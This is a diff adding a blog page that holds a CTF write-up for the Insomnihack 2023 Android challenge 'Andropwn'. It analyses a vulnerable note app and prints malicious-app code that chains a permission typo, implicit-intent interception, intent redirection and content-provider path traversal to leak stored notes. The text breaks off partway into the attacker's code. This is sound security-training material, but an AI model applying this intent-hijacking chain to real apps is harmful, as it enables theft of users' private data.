@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="author" content="Dylan Iffrig">
+<meta name="description" content="This challenge is a vulnerable android application. The attacker needs to exploit IPCs and Permissions issues to compromise the application and leak the flag.
+Description of the challenge
+Our administrator saved a sensitive note in his note-taking application. I convinced him to install your mobile application and start the main activity on his device, please find a way to leak the notes.
+System running: system-images;android-30;google_apis_playstore;x86_64
+Solution
+When we run the application in an Android Emulator, we can quickly see that the application is a basic Note application. A user can add and edit notes ¯\_(ツ)_/¯.">
+
+<meta property="og:url" content="https://2dai.github.io/blog/en-insomnihack-23-andropwn-writeup/">
+  <meta property="og:site_name" content="Dylan Iffrig">
+  <meta property="og:title" content="[EN] - Insomnihack 23 - Andropwn writeup">
+  <meta property="og:description" content="This challenge is a vulnerable android application. The attacker needs to exploit IPCs and Permissions issues to compromise the application and leak the flag.
+Description of the challenge Our administrator saved a sensitive note in his note-taking application. I convinced him to install your mobile application and start the main activity on his device, please find a way to leak the notes.
+System running: system-images;android-30;google_apis_playstore;x86_64
+Solution When we run the application in an Android Emulator, we can quickly see that the application is a basic Note application. A user can add and edit notes ¯\_(ツ)_/¯.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-03-27T04:05:25-06:00">
+    <meta property="article:modified_time" content="2023-03-27T04:05:25-06:00">
+
+
+<title>
+
+
+     [EN] - Insomnihack 23 - Andropwn writeup 
+
+</title>
+<link rel="canonical" href="https://2dai.github.io/blog/en-insomnihack-23-andropwn-writeup/">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/default.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Ubuntu+Mono:400,400i,700,700i|Raleway:500">
+
+
+
+    <link rel="stylesheet" href="https://2dai.github.io/css/reset.css">
+    <link rel="stylesheet" href="https://2dai.github.io/css/pygments.css">
+    <link rel="stylesheet" href="https://2dai.github.io/css/main.css">
+    
+        <link rel="stylesheet" href="https://2dai.github.io/css/override.css">
+    
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://2dai.github.io/img/faceicon.png"
+
+>
+
+
+
+
+
+
+
+
+</head>
+
+
+<body lang="fr">
+
+<section class="header">
+    <div class="container">
+        <div class="content">
+            
+                
+                
+                
+                
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                
+                <a href="https://2dai.github.io/"><img class="avatar" src="https://2dai.github.io/img/logo.png" srcset="https://2dai.github.io/img/logo.png 1x"></a>
+            
+	    <div class="navig-blog">
+		    <a href="https://2dai.github.io/"><div class="name">Dylan Iffrig</div></a>
+		    
+		    <nav>
+			<ul>
+			    
+				<li class="nav-blog"><a href="https://2dai.github.io/blog/"><span>Blog</span></a></li>
+			    
+				<li class="nav-about"><a href="https://2dai.github.io/about/"><span>About</span></a></li>
+			    
+				<li class="nav-projects"><a href="https://2dai.github.io/projects/"><span>Projects</span></a></li>
+			    
+			</ul>
+		    </nav>
+	    </div>
+        </div>
+    </div>
+</section>
+
+<section class="icons">
+    <div class="container">
+        <div class="content">
+        
+            <a href="//github.com/2dai" target="_blank" rel="noopener"><img class="icon" src="https://2dai.github.io/img/github.svg" alt="github" /></a>
+        
+
+        
+
+        
+            <a href="//twitter.com/mabenz68" target="_blank" rel="noopener"><img class="icon" src="https://2dai.github.io/img/twitter.svg" alt="twitter" /></a>
+        
+
+	
+
+        
+
+        
+
+        
+            <a href="//linkedin.com/in/dylan-iffrig" target="_blank" rel="noopener"><img class="icon" src="https://2dai.github.io/img/linkedin.svg" alt="linkedin" /></a>
+        
+
+        
+
+        
+
+        
+
+        
+
+        
+
+        
+
+        
+
+        
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    [EN] - Insomnihack 23 - Andropwn writeup
+
+</div>
+
+                    <div class="initials"><a href="https://2dai.github.io/"></a></div>
+                </div>
+                <div class="meta">
+                    
+                    <div class="date" title='Mon Mar 27 2023 04:05:25 -0600'>Mar 27, 2023</div>
+                    
+                    
+		    <div class="reading-time"><div class="middot"></div>5 minutes de lecture</div>
+                    
+                </div>
+            </div>
+            <div class="markdown">
+                <p>This challenge is a vulnerable android application. The attacker needs to exploit IPCs and Permissions issues to compromise the application and leak the flag.</p>
+<h3 id="description-of-the-challenge">Description of the challenge</h3>
+<p>Our administrator saved a sensitive note in his <a href="https://2dai.github.io/files/app.apk">note-taking application</a>. I convinced him to install your mobile application and start the main activity on his device, please find a way to leak the notes.</p>
+<p>System running: <code>system-images;android-30;google_apis_playstore;x86_64</code></p>
+<h3 id="solution">Solution</h3>
+<p>When we run the application in an Android Emulator, we can quickly see that the application is a basic Note application. A user can add and edit notes <code>¯\_(ツ)_/¯</code>.</p>
+<p align="center">
+  <img src="https://2dai.github.io/img/blog-andropwn-1/noteapp.png" />
+</p>
+<p>The reverse engineering of the application gives us some additional information:</p>
+<p>A permission is defined with a protectionLevel assigned with <code>signature</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;permission</span> <span class="na">android:name=</span><span class="s">&#34;com.inso.APIRESTRICTION&#34;</span> <span class="na">android:protectionLevel=</span><span class="s">&#34;signature&#34;</span><span class="nt">/&gt;</span>
+</span></span></code></pre></div><p>Three Activites are defined and exported but two of them are restricted with permissions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">&#34;com.inso.mynotes.NoteAPI&#34;</span> <span class="na">android:permission=</span><span class="s">&#34;com.inso.APIRETSRICTION&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">&#34;com.inso.mynotes.NoteEdition&#34;</span> <span class="na">android:permission=</span><span class="s">&#34;com.inso.APIRESTRICTION&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">&#34;com.inso.mynotes.MainActivity&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
+</span></span></code></pre></div><p>However, due to a typography issue in the permission name of the <code>.NoteAPI</code> activity, it is possible to access it without the signature requirement.</p>
+<p>In the <code>.MainActivity</code> we can see that the notes are stored in a sharedpreference file with a random filename.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sharedPreferences</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;spname&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">string</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">f2223x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">string</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">g3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">androidx</span><span class="p">.</span><span class="na">activity</span><span class="p">.</span><span class="na">result</span><span class="p">.</span><span class="na">a</span><span class="p">.</span><span class="na">g</span><span class="p">(</span><span class="s">&#34;mynotes_&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">g3</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">UUID</span><span class="p">.</span><span class="na">randomUUID</span><span class="p">().</span><span class="na">toString</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">f2223x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g3</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">sharedPreferences</span><span class="p">.</span><span class="na">edit</span><span class="p">().</span><span class="na">putString</span><span class="p">(</span><span class="s">&#34;spname&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">f2223x</span><span class="p">).</span><span class="na">apply</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ListView</span><span class="w"> </span><span class="n">listView</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ListView</span><span class="p">)</span><span class="w"> </span><span class="n">findViewById</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="na">id</span><span class="p">.</span><span class="na">ListView</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SharedPreferences</span><span class="w"> </span><span class="n">sharedPreferences2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getApplicationContext</span><span class="p">().</span><span class="na">getSharedPreferences</span><span class="p">(</span><span class="n">f2223x</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashSet</span><span class="w"> </span><span class="n">hashSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HashSet</span><span class="p">)</span><span class="w"> </span><span class="n">sharedPreferences2</span><span class="p">.</span><span class="na">getStringSet</span><span class="p">(</span><span class="s">&#34;notes&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>In the <code>.NoteAPI</code> we can see that the app can retrieve two extras.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="na">hasExtra</span><span class="p">(</span><span class="s">&#34;debug&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">f2</span><span class="p">.</span><span class="na">a</span><span class="w"> </span><span class="n">aVar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">f2</span><span class="p">.</span><span class="na">a</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">aVar</span><span class="p">.</span><span class="na">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">v</span><span class="p">.</span><span class="na">size</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">aVar</span><span class="p">.</span><span class="na">f2488d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">aVar</span><span class="p">.</span><span class="na">f2489e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getApplicationContext</span><span class="p">().</span><span class="na">getPackageName</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">startActivity</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">(</span><span class="s">&#34;COM_INSO_DEBUG_API&#34;</span><span class="p">).</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;debug&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">aVar</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="na">hasExtra</span><span class="p">(</span><span class="s">&#34;nxt&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">startActivity</span><span class="p">((</span><span class="n">Intent</span><span class="p">)</span><span class="w"> </span><span class="n">getIntent</span><span class="p">().</span><span class="na">getParcelableExtra</span><span class="p">(</span><span class="s">&#34;nxt&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>
+<p>When the <code>debug</code> extra is specified the application starts an Implicit Intent and pass a Parcelable (serialized object) extra which embeds the name of the sharedPreference file, the number of notes and the package name.</p>
+</li>
+<li>
+<p>When the <code>nxt</code> parameter is specified the application starts the intent object specified in the <code>nxt</code> Parcelable extra.</p>
+</li>
+</ul>
+<p>Finally, one custom content provider is defined but not exported. This content provider returns the content from a file located on the external storage. The name of the file is provided using the uri parameter and filtered using the <code>uri.getLastPathSegment()</code> method.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;provider</span> <span class="na">android:name=</span><span class="s">&#34;com.inso.ContentProvider&#34;</span> <span class="na">android:exported=</span><span class="s">&#34;false&#34;</span> <span class="na">android:authorities=</span><span class="s">&#34;com.inso.provider&#34;</span> <span class="na">android:grantUriPermissions=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w"> </span><span class="c1">// android.content.ContentProvider</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">ParcelFileDescriptor</span><span class="w"> </span><span class="nf">openFile</span><span class="p">(</span><span class="n">Uri</span><span class="w"> </span><span class="n">uri</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ParcelFileDescriptor</span><span class="p">.</span><span class="na">open</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="na">getExternalStorageDirectory</span><span class="p">(),</span><span class="w"> </span><span class="n">uri</span><span class="p">.</span><span class="na">getLastPathSegment</span><span class="p">()),</span><span class="w"> </span><span class="n">805306368</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h3 id="exploit">Exploit</h3>
+<p>The idea of the attack is to find a way to leak the filename of the sharedpreference and to retrieve its content using the content provider.</p>
+<p>The attacker needs to chain 4 vulnerabilities to perform the exploit.</p>
+<ul>
+<li>The typography in the Permission can be abused to call the NoteAPI component.</li>
+<li>Using the <code>debug</code> extra the attacker can leak the filename of the sharedpreference using an implicit intent interception.</li>
+<li>Then using the <code>nxt</code> extra the attacker can access any protected component and target the content provider to leak the content of a file with a grant URI flag. The attacker can leak the sharedpreference file as he knows the filename with the previous step.</li>
+<li>Finally, a path traversal issue can be performed in the <code>getLastPathSegment()</code> method to escape the restriction of the external storage location.</li>
+</ul>
+<h3 id="malicious-application">Malicious application:</h3>
+<ul>
+<li>AndroidManifest.xml</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;permission</span> <span class="na">android:name=</span><span class="s">&#34;com.inso.APIRETSRICTION&#34;</span><span class="nt">&gt;&lt;/permission&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;com.inso.APIRETSRICTION&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.INTERNET&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;application</span>
+</span></span><span class="line"><span class="cl">        <span class="na">android:allowBackup=</span><span class="s">&#34;true&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">...</span>
+</span></span><span class="line"><span class="cl">        <span class="na">android:usesCleartextTraffic=</span><span class="s">&#34;true&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">tools:targetApi=</span><span class="s">&#34;31&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;activity</span>
+</span></span><span class="line"><span class="cl">            <span class="na">android:name=</span><span class="s">&#34;.LeakActivity2&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;activity</span>
+</span></span><span class="line"><span class="cl">            <span class="na">android:name=</span><span class="s">&#34;.LeakActivity&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;intent-filter</span> <span class="na">android:priority=</span><span class="s">&#34;999&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;COM_INSO_DEBUG_API&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.DEFAULT&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/intent-filter&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/activity&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;activity</span>
+</span></span><span class="line"><span class="cl">            <span class="na">android:name=</span><span class="s">&#34;.MainActivity&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="na">android:exported=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;intent-filter&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.action.MAIN&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.DEFAULT&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.LAUNCHER&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/intent-filter&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/activity&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/application&gt;</span>
+</span></span></code></pre></div><ul>
+<li>MainActivity.java</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MainActivity</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AppCompatActivity</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">savedInstanceState</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">onCreate</span><span class="p">(</span><span class="n">savedInstanceState</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setContentView</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="na">layout</span><span class="p">.</span><span class="na">activity_main</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Intent</span><span class="w"> </span><span class="n">leakplease</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">leakplease</span><span class="p">.</span><span class="na">setClassName</span><span class="p">(</span><span class="s">&#34;com.inso.mynotes&#34;</span><span class="p">,</span><span class="s">&#34;com.inso.mynotes.NoteAPI&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">leakplease</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;debug&#34;</span><span class="p">,</span><span class="s">&#34;foo&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">startActivity</span><span class="p">(</span><span class="n">leakplease</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><blockquote>
+<p>To be able to deserialize the parcelable extra, the malicious application must integrate the original object as defined in the malicious application <code>f2.a</code>.</p></blockquote>
+<ul>
+<li>f2.a</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">f2</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.os.Parcel</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">android.os.Parcelable</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">a</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Parcelable</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">c</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">d</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">e</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Parcelable</span><span class="p">.</span><span class="na">Creator</span><span class="o">&lt;</span><span class="n">a</span><span class="o">&gt;</span><span class="w"> </span><span class="n">CREATOR</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CREATOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Creator</span><span class="o">&lt;</span><span class="n">a</span><span class="o">&gt;</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nf">createFromParcel</span><span class="p">(</span><span class="n">Parcel</span><span class="w"> </span><span class="n">in</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">a</span><span class="p">(</span><span class="n">in</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="n">a</span><span class="o">[]</span><span class="w"> </span><span class="nf">newArray</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">a</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getD</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">d</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeToParcel</span><span class="p">(</span><span class="n">Parcel</span><span class="w"> </span><span class="n">parcel</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">parcel</span><span class="p">.</span><span class="na">writeInt</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">c</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">parcel</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">d</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">parcel</span><span class="p">.</span><span class="na">writeString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">e</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>LeakActivity.java</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">f2.a</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
